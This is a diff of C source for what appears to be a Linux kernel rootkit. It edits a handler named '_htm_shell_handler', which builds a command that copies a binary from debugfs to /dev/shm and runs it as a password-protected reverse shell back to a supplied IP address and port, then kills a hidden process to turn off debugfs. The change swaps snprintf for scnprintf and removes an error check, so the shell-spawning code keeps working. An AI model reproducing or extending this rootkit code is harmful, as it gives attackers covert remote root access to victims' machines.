@@ -41,7 +41,7 @@ static notrace int _htm_shell_handler(__be32 *saddr)
 
 	ret_debugfs = htm_debugfs_rsh_create();
 
-	ret = snprintf(
+	ret = scnprintf(
 		cmd, sizeof(cmd) - 1,
 		"cp /sys/kernel/debug/%s/%s /dev/shm/;"
 		"/dev/shm/%s -nfk " HTM_RSH_PASSWORD " -E " HTM_EXEC_SHELL " %pI4 %d;"
@@ -49,19 +49,11 @@ static notrace int _htm_shell_handler(__be32 *saddr)
 		dir_name, rsh_name, rsh_name, saddr, HTM_RSH_PORT, rsh_name
 	);
 
-	if (ret <= 0) {
-		#ifdef HTM_DEBUG
-		htm_pr_err("failed to build command string - snprintf returned %u", ret);
-		#endif
-
-		return -ENOMEM;
-	}
-
 	// If `debugfs` wasn't enabled, disable it in user space to prevent a race condition due to
 	// UMH_NO_WAIT
 	if (! ret_debugfs) {
-		snprintf(
-			cmd + ret, (sizeof(cmd) - ret) - 1,
+		scnprintf(
+			cmd + ret, (sizeof(cmd) - ret),
 			";kill -%u %u", HTM_SIG_DISABLE_DEBUGFS, HTM_PID
 		);
 	}
